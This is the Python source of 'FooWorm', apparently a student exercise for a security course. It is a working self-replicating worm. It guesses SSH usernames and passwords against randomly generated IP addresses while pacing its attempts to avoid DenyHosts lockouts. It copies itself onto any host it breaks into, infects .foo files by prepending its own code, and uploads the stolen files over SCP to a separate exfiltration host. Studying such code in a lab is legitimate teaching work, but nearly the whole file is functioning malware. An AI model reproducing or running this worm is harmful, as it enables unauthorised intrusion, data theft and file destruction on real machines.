
### FooWorm.py

### Author: Fabiha Tasneem (1805072@ugrad.cse.buet.ac.bd)
### Date:   August 1, 2023

import sys
import os
import random
import paramiko
import scp
import signal

print("""\nHELLO FROM FooWorm\n\n""")
print("""This is a demonstration of how easy it is to write a self-replicating program. 
This worm will infect all files with names ending in .foo in the directory in which you execute an infected file.  
If you send an infected file to someone else and they execute it, their, foo files will be damaged also muhahahaha.\n\n""")        


# AbraWorm.py starts here
def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1      # IMPORTANT:  Before changing this setting, read the last
               #             paragraph of the main comment block above. As
               #             mentioned there, you need to provide two IP
               #             addresses in order to run this code in debug 
               #             mode. 

##  The following numbers do NOT mean that the worm will attack only 3
##  hosts for 3 different usernames and 3 different passwords.  Since the
##  worm operates in an infinite loop, at each iteration, it generates a
##  fresh batch of hosts, usernames, and passwords.
NHOSTS = NUSERNAMES = NPASSWDS = 3


##  The trigrams and digrams are used for syntheizing plausible looking
##  usernames and passwords.  See the subroutines at the end of this script
##  for how usernames and passwords are generated by the worm.
trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams  = digrams.split()

def get_new_usernames(how_many):
    if debug: return ['root']      # need a working username for debugging
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] 
          if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    if debug: return ['mypassword']      # need a working username for debugging
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) 
                if random.random() > 0.5 else '') if int(selector[x]) == 1 
                        else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug: return ['172.17.0.10']   
                    # Provide one or more IP address that you
                    # want `attacked' for debugging purposes.
                    # The usrname and password you provided
                    # in the previous two functions must
                    # work on these hosts.
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses 

# For the same IP address, we do not want to loop through multiple user 
# names and passwords consecutively since we do not want to be quarantined 
# by a tool like DenyHosts at the other end.  So let's reverse the order 
# of looping.
while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds =   get_new_passwds(NPASSWDS)
#    print("usernames: %s" % str(usernames))
#    print("passwords: %s" % str(passwds))
    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected to ", ip_address)
                    # Let's make sure that the target host was not previously infected:
                    received_list = error = None
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error: 
                        print(error)
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print("\n\noutput of 'ls' command: %s" % str(received_list))
                    # if ''.join(received_list).find('FooWorm') >= 0: 
                    #     print("\nThe target machine is already infected\n")      
                    #     continue
                    # Now let's look for files that contain the extension '.foo'
                    cmd = 'ls *.foo'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    error = stderr.readlines()
                    if error: 
                        print("Error : ",error)
                        continue
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    for item in received_list:
                        files_of_interest_at_target.append(item.strip())
                    print("\nfiles of interest at the target: %s\n" % str(files_of_interest_at_target))
                    scpcon = scp.SCPClient(ssh.get_transport())
                    if len(files_of_interest_at_target) > 0:
                        for target_file in files_of_interest_at_target:
                            print("\n\nDownloading ", target_file, " from target\n")
                            scpcon.get(target_file)
                    # Now deposit a copy of FooWorm.py at the target host:
                    scpcon.put(sys.argv[0])
                    scpcon.close()
                except:
                    print("\n\nException: No connection to %s\n" % ip_address)
                    continue
                # Now upload the exfiltrated files to a specially designated host,
                # which can be a previously infected host.  The worm will only 
                # use those previously infected hosts as destinations for 
                # exfiltrated files if it was able to send the login credentials
                # used on those hosts to its human masters through, say, a 
                # secret IRC channel. (See Lecture 29 on IRC)
                if len(files_of_interest_at_target) > 0:
                    print("\nWill now try to infect the files first with FooVirus")
                    # FooVirus.py starts here
                    IN = open(sys.argv[0], 'r')
                    fooworm = [line for (i,line) in enumerate(IN) if i < 185]

                    for filename in files_of_interest_at_target:
                        file_of_interest = open(filename, 'r')
                        all_of_it = file_of_interest.readlines()
                        file_of_interest.close()
                        if any('FooWorm' in line for line in all_of_it): continue       # if the file is already infected, skip it
                        os.chmod(filename, 0o777)
                        OUT = open(filename, 'w')
                        OUT.writelines(fooworm)
                        all_of_it = ['#' + line for line in all_of_it]
                        OUT.writelines(all_of_it)
                        OUT.close()
                    print("\nWill now try to exfiltrate the files")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        #  For exfiltration demo to work, you must provide an IP address and the login 
                        #  credentials in the next statement:
                        ssh.connect('172.17.0.11',port=22,username='root',password='mypassword',timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\n\nconnected to exfiltration host\n")
                        for filename in files_of_interest_at_target:
                            filename = filename.decode('utf-8')
                            print("\n\nUploading ", filename, " to exfiltration host\n")
                            scpcon.put(filename)
                        scpcon.close()
                    except: 
                        print("Exception: No uploading of exfiltrated files\n")
                        continue
    if debug: break
